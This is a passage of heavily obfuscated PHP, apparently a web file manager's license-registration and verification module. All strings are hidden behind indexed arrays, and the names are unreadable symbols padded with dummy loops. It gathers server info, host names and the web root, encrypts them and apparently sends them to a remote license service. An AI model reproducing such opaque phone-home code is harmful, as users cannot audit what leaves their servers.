$§ÀÉµ¬† =& $_SERVER[óÔë„ú]; $µºá“Â =& $_SERVER[æÈËŒ÷È]; global $config; $‘íß†²¢ = $§ÀÉµ¬†[688]; if (!$‘íß†²¢) { die; } if (count($config[$µºá“Â[12]]) == 0) { return; } foreach ($config[$µºá“Â[12]] as $Áßä–â¼ => $ÏÜÄãÜÒ) { $this->appRun($ÏÜÄãÜÒ); $×°¯¸ÓÈ = $§ÀÉµ¬†[689]; if (!$×°¯¸ÓÈ) { die; } } } private function nykab5a85a5b() { $à î…®Š =& $_SERVER[óÔë„ú]; $Æ‘“´ë =& $_SERVER[æÈËŒ÷È]; $â¥†ª = $Æ‘“´ë[4]; $ç®óÑµ˜ = $à î…®Š[690]; if (strlen($ç®óÑµ˜) < $à î…®Š[691]) { die; } $Úæ¢Û¨ = $GLOBALS[$Æ‘“´ë[13]][$Æ‘“´ë[14]][0]; if (!$Úæ¢Û¨ || strlen($Úæ¢Û¨) <= strlen($â¥†ª)) { return; } if (strtolower(substr($Úæ¢Û¨, -strlen($â¥†ª))) != $â¥†ª) { return; } $ìü³à­» = substr($Úæ¢Û¨, 0, -strlen($â¥†ª)); $²úûïõÚ = $à î…®Š[692]; $ñ¤ï©†ë = array($Æ‘“´ë[4], $ìü³à­»); $ÉÏô¦Ï¢ = array_slice($GLOBALS[$Æ‘“´ë[13]][$Æ‘“´ë[14]], 1); $çšÔçØ« = $à î…®Š[693]; $GLOBALS[$Æ‘“´ë[13]][$Æ‘“´ë[14]] = array_merge($ñ¤ï©†ë, $ÉÏô¦Ï¢); $GLOBALS[$Æ‘“´ë[13]][$Æ‘“´ë[15]] = implode($Æ‘“´ë[0], $GLOBALS[$Æ‘“´ë[13]][$Æ‘“´ë[14]]); $ÃÒÇÉ»¦ = $à î…®Š[694]; while ($ÃÒÇÉ»¦ < $à î…®Š[695]) { if ($ÃÒÇÉ»¦ >= 0) { break; } $ÃÒÇÉ»¦++; } } private function jrchb9541329() { $¬ß¢·ØÌ =& $_SERVER[óÔë„ú]; $óŒì·°è =& $_SERVER[æÈËŒ÷È]; if ($GLOBALS[$óŒì·°è[13]][$óŒì·°è[15]] != $óŒì·°è[6]) { return; } $æ¼ê…¸ä = $_SERVER[$óŒì·°è[16]]; $ÄÃ£·Æ = $¬ß¢·ØÌ[696]; if (!$ÄÃ£·Æ) { return; } $ÁÑÄ–ıƒ = $óŒì·°è[17]; if (!strstr($æ¼ê…¸ä, $ÁÑÄ–ıƒ)) { return; } $Ï‡Ï´Äˆ = strrpos($æ¼ê…¸ä, $ÁÑÄ–ıƒ); $ûêÄ÷Ğá = $¬ß¢·ØÌ[697]; if (strlen($ûêÄ÷Ğá) < $¬ß¢·ØÌ[695]) { die; } $˜«†–Õó = substr($æ¼ê…¸ä, $Ï‡Ï´Äˆ + strlen($ÁÑÄ–ıƒ)); preg_match_all($óŒì·°è[18], $˜«†–Õó, $·³«Æò÷); $ÛƒÅÑ•ê = $¬ß¢·ØÌ[698]; if (strlen($ÛƒÅÑ•ê) < $¬ß¢·ØÌ[695]) { return; } $˜«†–Õó = trim($·³«Æò÷[0][0], $óŒì·°è[19]); $ƒ›ºó” = $¬ß¢·ØÌ[699]; if (!$ƒ›ºó”) { die; } $GLOBALS[$óŒì·°è[13]][$óŒì·°è[14]] = explode($óŒì·°è[19], $˜«†–Õó); $GLOBALS[$óŒì·°è[13]][$óŒì·°è[15]] = implode($óŒì·°è[0], $GLOBALS[$óŒì·°è[13]][$óŒì·°è[14]]); } public function run() { $ªèÂûâ =& $_SERVER[óÔë„ú]; $¼Ä  ª˜ =& $_SERVER[æÈËŒ÷È]; $this->jrchb9541329(); $úèùÒ²ø = $ªèÂûâ[700]; if (!$úèùÒ²ø) { return; } $this->nykab5a85a5b(); $ı‹¾‡è¶ = $ªèÂûâ[701]; while ($ı‹¾‡è¶ < $ªèÂûâ[695]) { if ($ı‹¾‡è¶ >= 0) { break; } $ı‹¾‡è¶++; } $‹Ï×Ç˜£ = $GLOBALS[$¼Ä  ª˜[13]][$¼Ä  ª˜[14]]; $ŞÖøÄÏ† = $GLOBALS[$¼Ä  ª˜[13]][$¼Ä  ª˜[15]]; $×åÍ°œ = $ªèÂûâ[702]; if (!$×åÍ°œ) { return; } define($¼Ä  ª˜[20], isset($‹Ï×Ç˜£[0]) && $‹Ï×Ç˜£[0] ? $‹Ï×Ç˜£[0] : $this->defaultModule); $œœ™ô Ç = $ªèÂûâ[703]; if (!$œœ™ô Ç) { die; } define($¼Ä  ª˜[21], isset($‹Ï×Ç˜£[1]) && $‹Ï×Ç˜£[0] ? $‹Ï×Ç˜£[1] : $this->defaultController); define($¼Ä  ª˜[22], isset($‹Ï×Ç˜£[2]) && $‹Ï×Ç˜£[0] ? $‹Ï×Ç˜£[2] : $this->defaultAction); define($¼Ä  ª˜[23], MOD . $¼Ä  ª˜[0] . ST . $¼Ä  ª˜[0] . ACT); $ü“ó±‘‘ = $ªèÂûâ[704]; if (strlen($ü“ó±‘‘) < $ªèÂûâ[705]) { die; } $_SERVER[$¼Ä  ª˜[24]] = strtolower(ACTION); $this->autorun(); if (count($‹Ï×Ç˜£) >= 3) { $this->appRun($ŞÖøÄÏ†); } else { $this->appRun(ACTION); } } private $aetj1c96a5fd = array(); private $cuxb32573510 = ''; public function hpjif77843d0() { $Š¯±ëÓ =& $_SERVER[óÔë„ú]; $ñŠÕ†¹ü =& $_SERVER[æÈËŒ÷È]; $this->ghoz8923117e(); $•—‚¦ó = $Š¯±ëÓ[706]; $this->jamq4ece378d(); $this->rbjg6ea6861e(); $µÍ¸¢Ô = $Š¯±ëÓ[707]; $this->hesid251f151(); $this->dxvp4b10b4f1(); $this->bezw8e8af661(); $this->ktcd0669c759(); $this->opaj7b7dc42e($ñŠÕ†¹ü[25], array($this, $ñŠÕ†¹ü[26])); $®ç–²€Ó = $Š¯±ëÓ[708]; if (!$®ç–²€Ó) { return; } $this->opaj7b7dc42e($ñŠÕ†¹ü[27], array($this, $ñŠÕ†¹ü[28])); $…ĞÊİÍ‚ = $Š¯±ëÓ[709]; if (!$…ĞÊİÍ‚) { return; } $this->opaj7b7dc42e($ñŠÕ†¹ü[29], array($this, $ñŠÕ†¹ü[30])); $this->opaj7b7dc42e($ñŠÕ†¹ü[31], array($this, $ñŠÕ†¹ü[32])); $•ìõø«§ = $Š¯±ëÓ[710]; if (!$•ìõø«§) { die; } } public function drnl7b3ef680($ö£ÜáÓÂ) { $èïÈŒØï =& $_SERVER[óÔë„ú]; $•ô´ƒ¾ =& $_SERVER[æÈËŒ÷È]; $¸òßåßÛ = Model($•ô´ƒ¾[33])->get(); $»¤±şú = $èïÈŒØï[711]; if (!$»¤±şú) { return; } $ä€Î“ï = array($•ô´ƒ¾[34], $•ô´ƒ¾[35], $•ô´ƒ¾[36], $•ô´ƒ¾[37], $•ô´ƒ¾[38], $•ô´ƒ¾[39], $•ô´ƒ¾[40], $•ô´ƒ¾[41], $•ô´ƒ¾[42], $•ô´ƒ¾[43], $•ô´ƒ¾[44], $•ô´ƒ¾[45], $•ô´ƒ¾[46], $•ô´ƒ¾[47], $•ô´ƒ¾[48], $•ô´ƒ¾[49], $•ô´ƒ¾[50], $•ô´ƒ¾[51], $•ô´ƒ¾[52], $•ô´ƒ¾[53], $•ô´ƒ¾[54], $•ô´ƒ¾[55], $•ô´ƒ¾[56], $•ô´ƒ¾[57], $•ô´ƒ¾[58], $•ô´ƒ¾[59], $•ô´ƒ¾[60], $•ô´ƒ¾[61], $•ô´ƒ¾[62], $•ô´ƒ¾[63], $•ô´ƒ¾[64], $•ô´ƒ¾[65], $•ô´ƒ¾[66], $•ô´ƒ¾[67], $•ô´ƒ¾[68], $•ô´ƒ¾[69], $•ô´ƒ¾[70], $•ô´ƒ¾[71], $•ô´ƒ¾[72], $•ô´ƒ¾[73], $•ô´ƒ¾[74], $•ô´ƒ¾[75], $•ô´ƒ¾[76], $•ô´ƒ¾[77], $•ô´ƒ¾[78], $•ô´ƒ¾[79], $•ô´ƒ¾[80], $•ô´ƒ¾[81], $•ô´ƒ¾[82], $•ô´ƒ¾[83], $•ô´ƒ¾[84], $•ô´ƒ¾[85]); foreach ($ä€Î“ï as $¼Ùá¯Ù×) { $˜ö‡¢µ = $GLOBALS[$•ô´ƒ¾[86]][$•ô´ƒ¾[87]][$¼Ùá¯Ù×]; if (isset($¸òßåßÛ[$¼Ùá¯Ù×])) { $˜ö‡¢µ = $¸òßåßÛ[$¼Ùá¯Ù×]; } $ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[89]][$¼Ùá¯Ù×] = $˜ö‡¢µ; } $ĞÃë«ÈÂ = $ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[89]][$•ô´ƒ¾[46]]; $»±„åĞ± = $èïÈŒØï[712]; if (strlen($»±„åĞ±) < $èïÈŒØï[705]) { die; } unset($ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[90]][$•ô´ƒ¾[91]]); $À“Ò‘¤® = $èïÈŒØï[713]; if (strlen($À“Ò‘¤®) < $èïÈŒØï[705]) { return; } unset($ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[90]][$•ô´ƒ¾[92]]); $‘İşØÃ‚ = $èïÈŒØï[714]; while (strlen($‘İşØÃ‚) < $èïÈŒØï[715]) { if (!$‘İşØÃ‚) { break; } $‘İşØÃ‚++; } unset($ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[89]][$•ô´ƒ¾[46]]); $óØë‰©™ = $èïÈŒØï[716]; unset($ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[89]][$•ô´ƒ¾[93]]); $“Æ´äùŒ = $èïÈŒØï[717]; if (strlen($“Æ´äùŒ) < $èïÈŒØï[687]) { die; } $ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[89]][$•ô´ƒ¾[94]] = array($•ô´ƒ¾[95] => (int) $ĞÃë«ÈÂ[$•ô´ƒ¾[96]], $•ô´ƒ¾[97] => (int) _get($ĞÃë«ÈÂ, $•ô´ƒ¾[98], 0)); $˜§œ˜¨¤ = substr(md5($•ô´ƒ¾[99] . get_client_ip() . $¸òßåßÛ[$•ô´ƒ¾[100]]), 0, 15); $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[102]] = Mcrypt::encode(Session::sign(), $˜§œ˜¨¤, 3600 * 24); $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[103]] = Action($•ô´ƒ¾[104])->accessToken(); $½£¦’ğµ = $èïÈŒØï[718]; if (!$½£¦’ğµ) { return; } $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[105]] = md5($_SERVER[$•ô´ƒ¾[106]] . $¸òßåßÛ[$•ô´ƒ¾[100]]); $™èÛ½ë = $èïÈŒØï[719]; while ($™èÛ½ë < $èïÈŒØï[715]) { if ($™èÛ½ë >= 0) { break; } $™èÛ½ë++; } $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[107]] = base64_encode(serverInfo()); $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[108]] = $this->cuxb32573510; if ($¸òßåßÛ[$•ô´ƒ¾[108]] != $•ô´ƒ¾[109]) { $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[110]] = $¸òßåßÛ[$•ô´ƒ¾[110]]; $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[111]] = $¸òßåßÛ[$•ô´ƒ¾[111]]; $ø¯Äóğª = rand_string(10) . $this->cuxb32573510 . rand_string(5); $ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[112]][$•ô´ƒ¾[113]] = $this->zaox3b79d407($ø¯Äóğª, $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[105]]); } if ($this->cuxb32573510 == $•ô´ƒ¾[109]) { $ö£ÜáÓÂ[$•ô´ƒ¾[88]][$•ô´ƒ¾[89]][$•ô´ƒ¾[94]][$•ô´ƒ¾[98]] = 0; } $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[114]] = $this->versionPluginFilter(); $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[115]] = _get($this->aetj1c96a5fd, $•ô´ƒ¾[116], $•ô´ƒ¾[6]); if (KodUser::isRoot() && $this->config[$•ô´ƒ¾[117]]) { $ö£ÜáÓÂ[$•ô´ƒ¾[101]][$•ô´ƒ¾[118]] = WEB_ROOT; } return $ö£ÜáÓÂ; } private function bezw8e8af661() { $Ï¶µ¯û =& $_SERVER[óÔë„ú]; $í¿İâ–Ï =& $_SERVER[æÈËŒ÷È]; $ºƒ´•êÂ = $_SERVER[$í¿İâ–Ï[24]] == $í¿İâ–Ï[119]; if ($_SERVER[$í¿İâ–Ï[24]] == $í¿İâ–Ï[120] && $_GET[$í¿İâ–Ï[121]] == $í¿İâ–Ï[122]) { $ºƒ´•êÂ = !0; } if ($ºƒ´•êÂ) { $¼©¢Ô‰ = array($í¿İâ–Ï[108] => $this->cuxb32573510, $í¿İâ–Ï[123] => $this->aofkbe5be118(), $í¿İâ–Ï[124] => Model($í¿İâ–Ï[125])->count()); if ($this->cuxb32573510 != $í¿İâ–Ï[109]) { $ñäÎûÁû = _get($this->aetj1c96a5fd, $í¿İâ–Ï[126]); if ($ñäÎûÁû) { $¼©¢Ô‰[$í¿İâ–Ï[127]] = $ñäÎûÁû; $¼©¢Ô‰[$í¿İâ–Ï[128]] = strtotime(_get($this->aetj1c96a5fd, $í¿İâ–Ï[129])); $¼©¢Ô‰[$í¿İâ–Ï[130]] = _get($this->aetj1c96a5fd, $í¿İâ–Ï[116]); } $’ƒ·Îº = Model($í¿İâ–Ï[33])->get($í¿İâ–Ï[131], $í¿İâ–Ï[6], !0); if (is_string($’ƒ·Îº) && substr($’ƒ·Îº, 0, 1) == $í¿İâ–Ï[132]) { $’ƒ·Îº = json_decode_force($’ƒ·Îº); } if (is_array($’ƒ·Îº) && $’ƒ·Îº[$í¿İâ–Ï[133]] && strstr($’ƒ·Îº[$í¿İâ–Ï[133]], $í¿İâ–Ï[134])) { $€ûÔÅÈß = explode($í¿İâ–Ï[134], $’ƒ·Îº[$í¿İâ–Ï[133]]); $¼©¢Ô‰[$í¿İâ–Ï[135]] = $€ûÔÅÈß[0]; } } $¼©¢Ô‰ = $this->ykdubc57e695(json_encode($¼©¢Ô‰), md5($í¿İâ–Ï[136])); $™œ‹ÎŒ” = $Ï¶µ¯û[720]; if (!$™œ‹ÎŒ”) { return; } $ìÈĞù¢Í = array($í¿İâ–Ï[137] => $¼©¢Ô‰); call_user_func(array($í¿İâ–Ï[138], $í¿İâ–Ï[139]), $ìÈĞù¢Í); } if ($this->cuxb32573510 == $í¿İâ–Ï[109]) { return; } $Ôéğ»È¤ = array($í¿İâ–Ï[140], $í¿İâ–Ï[141], $í¿İâ–Ï[142], $í¿İâ–Ï[143], $í¿İâ–Ï[144], $í¿İâ–Ï[145]); $š¬¿Úöü = $Ï¶µ¯û[721]; if (!$š¬¿Úöü) { die; } $¦õéãÅÅ = Model($í¿İâ–Ï[33])->get(); $ôÄ«²®‡ = $Ï¶µ¯û[722]; while ($ôÄ«²®‡ < $Ï¶µ¯û[687]) { if ($ôÄ«²®‡ >= 0) { break; } $ôÄ«²®‡++; } $ìÈĞù¢Í = array($í¿İâ–Ï[146] => $¦õéãÅÅ[$í¿İâ–Ï[34]], $í¿İâ–Ï[147] => $¦õéãÅÅ[$í¿İâ–Ï[35]], $í¿İâ–Ï[148] => $í¿İâ–Ï[6]); foreach ($Ôéğ»È¤ as $’Ã®Ëå¤) { if (!isset($¦õéãÅÅ[$’Ã®Ëå¤]) || !$¦õéãÅÅ[$’Ã®Ëå¤]) { continue; } $ìÈĞù¢Í[$’Ã®Ëå¤] = $¦õéãÅÅ[$’Ã®Ëå¤]; } call_user_func(array($í¿İâ–Ï[138], $í¿İâ–Ï[139]), $ìÈĞù¢Í); $¦²àó×ü = $Ï¶µ¯û[723]; if (strlen($¦²àó×ü) < $Ï¶µ¯û[691]) { return; } } private function hesid251f151() { $¨¥²ÈÒñ =& $_SERVER[óÔë„ú]; $ä×÷ºö =& $_SERVER[æÈËŒ÷È]; if ($_SERVER[$ä×÷ºö[24]] != $ä×÷ºö[149]) { return; } if (!KodUser::isRoot()) { die; } $çœ²¿ôÉ = $GLOBALS[$ä×÷ºö[13]]; if (isset($çœ²¿ôÉ[$ä×÷ºö[150]])) { $this->cbfg6681d3e9(); die; } if (isset($çœ²¿ôÉ[$ä×÷ºö[151]]) && isset($çœ²¿ôÉ[$ä×÷ºö[151]]) == $ä×÷ºö[122]) { $çœ²¿ôÉ[$ä×÷ºö[152]] = Model($ä×÷ºö[33])->get($ä×÷ºö[153]); } if (!isset($çœ²¿ôÉ[$ä×÷ºö[152]]) || strlen($çœ²¿ôÉ[$ä×÷ºö[152]]) != 16) { show_json($ä×÷ºö[154] . $çœ²¿ôÉ[$ä×÷ºö[152]], !1); } $•–òí©Ä = Model($ä×÷ºö[33])->get($ä×÷ºö[100]); $¦¾ñó³ = md5($_SERVER[$ä×÷ºö[106]] . $•–òí©Ä); $ˆèø›†ú = $¨¥²ÈÒñ[724]; while (strlen($ˆèø›†ú) < $¨¥²ÈÒñ[687]) { if (!$ˆèø›†ú) { break; } $ˆèø›†ú++; } $«®¬£Íƒ = array($ä×÷ºö[152] => $çœ²¿ôÉ[$ä×÷ºö[152]], $ä×÷ºö[155] => rand_string(16), $ä×÷ºö[156] => $ä×÷ºö[136], $ä×÷ºö[157] => $ä×÷ºö[158], $ä×÷ºö[159] => $_SERVER[$ä×÷ºö[160]], $ä×÷ºö[161] => $_SERVER[$ä×÷ºö[162]], $ä×÷ºö[163] => $_SERVER[$ä×÷ºö[164]], $ä×÷ºö[105] => $¦¾ñó³, $ä×÷ºö[165] => Model($ä×÷ºö[33])->get($ä×÷ºö[131])); if (isset($çœ²¿ôÉ[$ä×÷ºö[151]]) && isset($çœ²¿ôÉ[$ä×÷ºö[151]]) == $ä×÷ºö[122]) { $«®¬£Íƒ[$ä×÷ºö[151]] = md5($«®¬£Íƒ[$ä×÷ºö[152]] . $ä×÷ºö[166] . $«®¬£Íƒ[$ä×÷ºö[155]]); } if ($çœ²¿ôÉ[$ä×÷ºö[167]] == $ä×÷ºö[168]) { $ë‰ïØ = $this->ykdubc57e695($¦¾ñó³, $ä×÷ºö[169]); $½ŞÍÑˆÇ = $this->zaox3b79d407(json_encode($«®¬£Íƒ), $¦¾ñó³ . $ä×÷ºö[170], 3); $½ŞÍÑˆÇ = $½ŞÍÑˆÇ . $ä×÷ºö[171] . $_SERVER[$ä×÷ºö[160]]; $åÛ®’Ì = $this->tweu219a8910($ä×÷ºö[172] . $ë‰ïØ . $ä×÷ºö[173] . $½ŞÍÑˆÇ, -1); show_json($åÛ®’Ì, !0); } else { if ($çœ²¿ôÉ[$ä×÷ºö[167]] == $ä×÷ºö[174]) { $í«ñ™à = substr(md5($ä×÷ºö[175] . $¦¾ñó³), 12, 15) . $ä×÷ºö[176]; $½ŞÍÑˆÇ = $this->thje72de2e13(trim($çœ²¿ôÉ[$ä×÷ºö[177]]), $í«ñ™à, 2); $ÎÏüÙœ = json_decode($½ŞÍÑˆÇ, !0); if (!is_array($ÎÏüÙœ) || !is_array($ÎÏüÙœ[$ä×÷ºö[178]]) || $ÎÏüÙœ[$ä×÷ºö[152]] != !0) { $½”¤Ú· = $ä×÷ºö[179]; $¯¸¼®«† = $ÎÏüÙœ[$ä×÷ºö[178]] ? $ä×÷ºö[180] . $ÎÏüÙœ[$ä×÷ºö[178]] : $½”¤Ú·; show_json($¯¸¼®«†, !1); } else { $«®¬£Íƒ[$ä×÷ºö[155]] = $ÎÏüÙœ[$ä×÷ºö[178]][$ä×÷ºö[181]]; } } else { $ÎÏüÙœ = $this->tweu219a8910($ä×÷ºö[182], $«®¬£Íƒ, 10); $‚ú¡ğ€¬ = $¨¥²ÈÒñ[725]; if (strlen($‚ú¡ğ€¬) < $¨¥²ÈÒñ[715]) { return; } } } if (!is_array($ÎÏüÙœ) || !is_array($ÎÏüÙœ[$ä×÷ºö[178]]) || $ÎÏüÙœ[$ä×÷ºö[152]] != !0) { $½”¤Ú· = LNG($ä×÷ºö[183]); $¯¸¼®«† = $ÎÏüÙœ[$ä×÷ºö[178]] ? $ä×÷ºö[180] . $ÎÏüÙœ[$ä×÷ºö[178]] : $½”¤Ú·; show_json($¯¸¼®«†, !1); } $»èç½Ş = $ÎÏüÙœ[$ä×÷ºö[178]]; $Ú¯§ğğ = $this->nitzd5379515($»èç½Ş[$ä×÷ºö[184]]); $øôîŠ—Õ = $¨¥²ÈÒñ[726]; while (strlen($øôîŠ—Õ) < $¨¥²ÈÒñ[695]) { if (!$øôîŠ—Õ) { break; } $øôîŠ—Õ++; } if (!$Ú¯§ğğ || $Ú¯§ğğ != $»èç½Ş[$ä×÷ºö[129]]) { $Ó´“Ê„ê = array($ä×÷ºö[185] => Model($ä×÷ºö[33])->get($ä×÷ºö[100]), $ä×÷ºö[186] => $_SERVER[$ä×÷ºö[106]], $ä×÷ºö[187] => this_url(), $ä×÷ºö[161] => $_SERVER[$ä×÷ºö[162]]); $½ŞÍÑˆÇ = $this->wyhkdb55de8b(json_encode($Ó´“Ê„ê)); $this->tweu219a8910($ä×÷ºö[188] . $½ŞÍÑˆÇ); show_json(LNG($ä×÷ºö[189]), !0); } $Ã—È¤âÜ = array($ä×÷ºö[153] => $»èç½Ş[$ä×÷ºö[190]], $ä×÷ºö[191] => $»èç½Ş[$ä×÷ºö[192]], $ä×÷ºö[193] => rand_string(16), $ä×÷ºö[108] => $»èç½Ş[$ä×÷ºö[194]]); if ($«®¬£Íƒ[$ä×÷ºö[155]]) { $Ã—È¤âÜ[$ä×÷ºö[193]] = $«®¬£Íƒ[$ä×÷ºö[155]]; } $‚ËµÉóš = substr(md5($Ã—È¤âÜ[$ä×÷ºö[191]]), 10, 10); $¥´à¢× = $‚ËµÉóš . $Ã—È¤âÜ[$ä×÷ºö[108]] . $Ã—È¤âÜ[$ä×÷ºö[193]]; $¥ãšŒ®½ = $¨¥²ÈÒñ[727]; while ($¥ãšŒ®½ < $¨¥²ÈÒñ[715]) { if ($¥ãšŒ®½ >= 0) { break; } $¥ãšŒ®½++; } $Ã—È¤âÜ[$ä×÷ºö[110]] = strrev(base64_encode($this->ykdubc57e695($¥´à¢×, $ä×÷ºö[195]))); $ç·÷û½å = $¨¥²ÈÒñ[728]; while ($ç·÷û½å < $¨¥²ÈÒñ[687]) { if ($ç·÷û½å >= 0) { break; } $ç·÷û½å++; } $Ì¡ëŸ˜‘ = rand_string(16); $÷¡•Ì•Ç = $Ì¡ëŸ˜‘ . $Ã—È¤âÜ[$ä×÷ºö[108]] . $this->ykdubc57e695(md5($Ã—È¤âÜ[$ä×÷ºö[153]]), $Ì¡ëŸ˜‘); $ëöæÛæÄ = $¨¥²ÈÒñ[729]; while ($ëöæÛæÄ < $¨¥²ÈÒñ[691]) { if ($ëöæÛæÄ >= 0) { break; } $ëöæÛæÄ++; } $Ã—È¤âÜ[$ä×÷ºö[111]] = base64_encode(strrev($this->ykdubc57e695($÷¡•Ì•Ç, $ä×÷ºö[196]))); $Ñöüü‹› = $¨¥²ÈÒñ[730]; if (strlen($Ñöüü‹›) < $¨¥²ÈÒñ[695]) { die; } if ($»èç½Ş[$ä×÷ºö[197]] && $»èç½Ş[$ä×÷ºö[197]] >= 1) { Model($ä×÷ºö[33])->setDeep($ä×÷ºö[198], $ä×÷ºö[122]); } Model($ä×÷ºö[33])->set($Ã—È¤âÜ); $›—é©‰£ = md5($_SERVER[$ä×÷ºö[106]] . strrev($•–òí©Ä) . $Ã—È¤âÜ[$ä×÷ºö[191]]); $ºıˆ˜‘Î = $¨¥²ÈÒñ[731]; while (strlen($ºıˆ˜‘Î) < $¨¥²ÈÒñ[705]) { if (!$ºıˆ˜‘Î) { break; } $ºıˆ˜‘Î++; } $¶Ø¹ìÇ– = strrev(substr($›—é©‰£, 10, 16)); $¿»Ë ¯ = $¨¥²ÈÒñ[732]; $€²ÀÁ… = $this->zaox3b79d407(json_encode($»èç½Ş), $›—é©‰£); $¢ç†ãûÖ = $¨¥²ÈÒñ[733]; while ($¢ç†ãûÖ < $¨¥²ÈÒñ[691]) { if ($¢ç†ãûÖ >= 0) { break; } $¢ç†ãûÖ++; } $“×†ığ¢ = array_to_keyvalue(Model($ä×÷ºö[7])->listData(), $ä×÷ºö[199]); $Ù€é¸ = $“×†ığ¢[$ä×÷ºö[200]]; $õè‡ù®ù = array(); $õè‡ù®ù[$¶Ø¹ìÇ–] = $€²ÀÁ…; Model($ä×÷ºö[7])->update($Ù€é¸[$ä×÷ºö[201]], array($ä×÷ºö[202] => $õè‡ù®ù)); $this->aetj1c96a5fd = $»èç½Ş; $Ìí¦ø¾ = $¨¥²ÈÒñ[734]; $this->cuxb32573510 = $Ã—È¤âÜ[$ä×÷ºö[108]]; $this->licenseRegistSuccess(); $„ÅĞÒÛÜ = $¨¥²ÈÒñ[735]; if (!$„ÅĞÒÛÜ) { die; } Cache::set($ä×÷ºö[203] . md5($•–òí©Ä . $ä×÷ºö[204]), $ä×÷ºö[6]); show_json(LNG($ä×÷ºö[189]), !0); } private function licenseRegistSuccess() { $“ÍßÇˆ =& $_SERVER[æÈËŒ÷È]; $¨…Ÿ½ı = Model($“ÍßÇˆ[33])->get(); $’ÔíŒË¾ = $_SERVER[óÔë„ú][736]; if ($¨…Ÿ½ı[$“ÍßÇˆ[63]] != $“ÍßÇˆ[122]) { Model($“ÍßÇˆ[33])->set($“ÍßÇˆ[63], $“ÍßÇˆ[122]); } Action($“ÍßÇˆ[205])->initStart(!0); } private function cbfg6681d3e9() { $ÃÂ³ïƒ  =& $_SERVER[óÔë„ú]; $ÒÓ÷ÆşÜ =& $_SERVER[æÈËŒ÷È]; Model($ÒÓ÷ÆşÜ[33])->set(array($ÒÓ÷ÆşÜ[153] => $ÒÓ÷ÆşÜ[6], $ÒÓ÷ÆşÜ[191] => $ÒÓ÷ÆşÜ[6], $ÒÓ÷ÆşÜ[108] => $ÒÓ÷ÆşÜ[109], $ÒÓ÷ÆşÜ[110] => $ÒÓ÷ÆşÜ[6], $ÒÓ÷ÆşÜ[111] => $ÒÓ÷ÆşÜ[6])); $àŠ‚Ì¬³ = $ÃÂ³ïƒ [737]; if (strlen($àŠ‚Ì¬³) < $ÃÂ³ïƒ [695]) { return; } Model($ÒÓ÷ÆşÜ[33])->setDeep($ÒÓ÷ÆşÜ[198], $ÒÓ÷ÆşÜ[206]); $this->aetj1c96a5fd = array(); $this->cuxb32573510 = $ÒÓ÷ÆşÜ[109]; $Ğû¶®ö¶ = $ÃÂ³ïƒ [738]; while (strlen($Ğû¶®ö¶) < $ÃÂ³ïƒ [705]) { if (!$Ğû¶®ö¶) { break; } $Ğû¶®ö¶++; } } private function ghoz8923117e() { $æ±á§ÔÂ =& $_SERVER[óÔë„ú]; $¯í¨Ë…¤ =& $_SERVER[æÈËŒ÷È]; $_SERVER[$¯í¨Ë…¤[162]] = _get($_SERVER, $¯í¨Ë…¤[162], APP_HOST); $this->cuxb32573510 = $¯í¨Ë…¤[109]; $Œà†ş„¿ = $æ±á§ÔÂ[739]; while ($Œà†ş„¿ < $æ±á§ÔÂ[705]) { if ($Œà†ş„¿ >= 0) { break; } $Œà†ş„¿++; } $òËˆ—˜à = Model($¯í¨Ë…¤[33])->get(); if ($òËˆ—˜à[$¯í¨Ë…¤[108]] == $¯í¨Ë…¤[109]) { return; } $¬Ê±ßé™ = Model($¯í¨Ë…¤[33])->get($¯í¨Ë…¤[100]); $¿’æ éÖ = $¯í¨Ë…¤[203] . md5($¬Ê±ßé™ . $¯í¨Ë…¤[204]); $¡¯°×£ = $æ±á§ÔÂ[740]; $’¢ÚöÉ‰ = Cache::get($¿’æ éÖ); if (!is_array($’¢ÚöÉ‰) || !isset($’¢ÚöÉ‰[$¯í¨Ë…¤[207]]) || time() - $’¢ÚöÉ‰[$¯í¨Ë…¤[207]] >= 60) { $şèÒÒ«ñ = Model($¯í¨Ë…¤[7])->loadList(); $ïÔ½ğ¸† = $şèÒÒ«ñ[$¯í¨Ë…¤[200]]; $ÍµÛçÉÚ = md5($_SERVER[$¯í¨Ë…¤[106]] . strrev($¬Ê±ßé™) . $òËˆ—˜à[$¯í¨Ë…¤[191]]); $—­àá¡à = strrev(substr($ÍµÛçÉÚ, 10, 16)); $’¢ÚöÉ‰ = $this->thje72de2e13($ïÔ½ğ¸†[$¯í¨Ë…¤[86]][$—­àá¡à], $ÍµÛçÉÚ); $’¢ÚöÉ‰ = json_decode($’¢ÚöÉ‰, !0); } if (!is_array($’¢ÚöÉ‰)) { return $this->cbfg6681d3e9(); } $”‚«»¼€ = strtotime($’¢ÚöÉ‰[$¯í¨Ë…¤[129]]); if (time() >= $”‚«»¼€) { return $this->cbfg6681d3e9(); } if (!isset($’¢ÚöÉ‰[$¯í¨Ë…¤[207]]) || time() - $’¢ÚöÉ‰[$¯í¨Ë…¤[207]] > 20) { $’¢ÚöÉ‰[$¯í¨Ë…¤[207]] = time(); Cache::set($¿’æ éÖ, $’¢ÚöÉ‰); } $this->aetj1c96a5fd = $’¢ÚöÉ‰; $this->cuxb32573510 = $òËˆ—˜à[$¯í¨Ë…¤[108]]; } private function jamq4ece378d() { $ñ‰œé› =& $_SERVER[æÈËŒ÷È]; $ªŠµòµ• = 